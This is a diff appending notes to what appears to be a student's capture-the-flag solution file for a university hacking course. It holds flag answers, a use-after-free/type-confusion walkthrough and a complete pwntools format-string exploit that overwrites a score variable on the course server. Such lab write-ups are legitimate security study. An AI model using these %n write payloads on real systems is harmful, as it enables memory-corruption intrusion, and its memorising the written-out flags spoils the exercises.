@@ -397,5 +397,74 @@ def main():
 
 if __name__ == "__main__":
     main()
+-----------------------------------------------------------------------------------------------
+challenge #Touch Grass
+solution: never_gonna_give_you_up_42
+hint:  nc shell.hackintro.di.uoa.gr 34049
+    1 -> 0 -> (jim) -> 2 -> 0 -> 3 -> (koko) -> 5 -> 0 [Officer] Hello. I'm koko, club officer.
+    TYPE CONFUSION + USE-AFTER-FREE
 
+    nm frontdesk | grep win
+    objdump -d frontdesk
+
+    00001b8c <_ZN11ClubOfficer7requestEv>:
+    ...
+    1b9c:       e8 bc f6 ff ff              call   125d <_Z10print_flagv>
+    ClubOfficer::request() → καλεί print_flag()
+    To collect your flag you'll have to ask Mrs Anna at the front desk and give her the password: σουσάμι άνοιξε
+-----------------------------------------------------------------------------------------------
+challenge #opekebeee
+solution: 384eec94e294ea379cdbca4c3bcd226a
+hint:  AAAA %p %p %p %p %p %p %p %p 
+    AAAA 0xffffdbb8 0x4f 0x80491ad (nil) 0x1 0x41414141 0x20702520 0x25207025 ->6o arg τυπώνει η print_flag
+    nm highscore | grep score 
+    0804c020 D highscore 
+    0804c028 B userscore η διεύθυνση που θέλουμε
+    exploit.py:
+    #!/usr/bin/env python3
+
+from pwn import *
+
+# Σύνδεση στο service
+HOST = "shell.hackintro.di.uoa.gr"
+PORT = 45022
+
+# Διεύθυνση userscore (little endian)
+userscore = 0x0804c028
+
+# Μετατροπή σε bytes (little endian)
+addr = p32(userscore)
+
+# Offset που βρήκα
+offset = 6
+
+# Τιμή που θέλουμε (>10000)
+target = 10001
+
+# Payload:
+# addr + padding + %n
+payload = addr
+payload += f"%{target}x".encode()
+payload += f"%{offset}$n".encode()
+
+# Debug
+print(f"[+] Payload length: {len(payload)}")
+
+# Σύνδεση
+p = remote(HOST, PORT)
+
+# Διαβάζω αρχικό μήνυμα
+print(p.recv().decode(errors="ignore"))
+
+# Στέλνω payload
+p.sendline(payload)
+
+# Παίρνω απάντηση (πολλαπλά recv όπως λέει το hint)
+try:
+    while True:
+        print(p.recv().decode(errors="ignore"))
+except:
+    pass
+
+p.close()
 -----------------------------------------------------------------------------------------------
